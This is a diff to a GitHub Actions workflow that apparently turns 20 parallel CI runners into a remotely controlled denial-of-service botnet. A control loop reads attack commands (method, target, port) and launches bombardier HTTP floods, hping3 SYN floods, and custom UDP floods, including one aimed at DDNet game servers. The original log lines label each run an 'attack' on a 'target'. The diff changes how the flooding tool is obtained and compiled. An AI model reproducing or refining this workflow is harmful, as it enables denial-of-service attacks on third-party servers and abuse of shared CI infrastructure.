@@ -11,32 +11,27 @@ jobs:
         runner: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20]
 
     steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
       - name: Setup Tools
         run: |
           sudo apt-get update
           sudo apt-get install -y hping3 golang-go wget curl jq
           
-          # Установка Bombardier
+          # Установка bombardier
           wget -q https://github.com/codesenberg/bombardier/releases/download/v1.2.6/bombardier-linux-amd64 -O bombardier
           chmod +x bombardier && sudo mv bombardier /usr/local/bin/
           
-          # СКАЧИВАНИЕ ФАЙЛА (Заменил на curl и прямой домен)
-          # Если этот способ снова выдаст HTML, используй Вариант 1 (GitHub Gist)
-          DROPBOX_URL="https://dl.dropboxusercontent.com/scl/fi/zomtm1n4fk8c9bhigxo6c/bombarida.go?rlkey=7axesdmxaztkxo7ie55uybp3m"
-          curl -L "$DROPBOX_URL" -o bombarida.go
-          
-          # Проверка содержимого
-          if grep -q "<!DOCTYPE html>" bombarida.go || grep -q "<html" bombarida.go; then
-            echo "-------------------------------------------------------"
-            echo "ОШИБКА: Dropbox всё еще отдает HTML вместо кода!"
-            echo "Пожалуйста, залейте файл на GitHub Gist или в этот репозиторий."
-            echo "-------------------------------------------------------"
+          # Компиляция своего файла
+          if [ -f "bombarida.go" ]; then
+            go build -o bombarida_bin bombarida.go
+            chmod +x bombarida_bin
+            echo "SUCCESS: bombarida compiled."
+          else
+            echo "ERROR: bombarida.go not found in repo!"
             exit 1
           fi
-
-          # Компилируем
-          go build -o bombarida_bin bombarida.go || { echo "Ошибка компиляции Go!"; exit 1; }
-          chmod +x bombarida_bin
 
       - name: Control Loop
         env:
@@ -55,23 +50,25 @@ jobs:
                 METHOD=$(echo "$DATA" | jq -r '.method')
                 TARGET=$(echo "$DATA" | jq -r '.target')
                 PORT=$(echo "$DATA" | jq -r '.port')
-                CONNS=$(echo "$DATA" | jq -r '.conns')
+                CONNS=$(echo "$DATA" | jq -r '.conns // 100')
 
                 sudo killall bombardier hping3 bombarida_bin 2>/dev/null || true
                 
                 if [ "$METHOD" == "stop" ]; then
-                  echo ">>> STOP (ID: $ID) <<<"
+                  echo ">>> STOPPED <<<"
                 else
-                  echo "=== АТАКА: $METHOD | ЦЕЛЬ: $TARGET | ID: $ID ==="
+                  echo "=================================================="
+                  echo "RUNNING: $METHOD | TARGET: $TARGET | ID: $ID"
+                  echo "=================================================="
 
                   if [ "$METHOD" == "http" ]; then
                     while true; do bombardier -c 1000 -d 3600s --http2 -l "$TARGET?cache=$RANDOM"; done &
                   elif [ "$METHOD" == "tcp" ]; then
                     sudo hping3 --flood -S -p $PORT $TARGET &
                   elif [ "$METHOD" == "udp" ]; then
-                    ./bombarida_bin -mode client -addr "${TARGET}:${PORT}" -c $CONNS -n 0 -d 3600s -r 0 -t 1s &
+                    ./bombarida_bin -mode client -addr "${TARGET}:${PORT}" -c $CONNS -d 3600s &
                   elif [ "$METHOD" == "udp-ddnet" ]; then
-                    ./bombarida_bin -mode client -addr "${TARGET}:${PORT}" -ddnet-info -open-loop -c $CONNS -n 0 -d 3600s -r 0 -t 1s &
+                    ./bombarida_bin -mode client -addr "${TARGET}:${PORT}" -ddnet-info -c $CONNS -d 3600s &
                   fi
                 fi
               fi
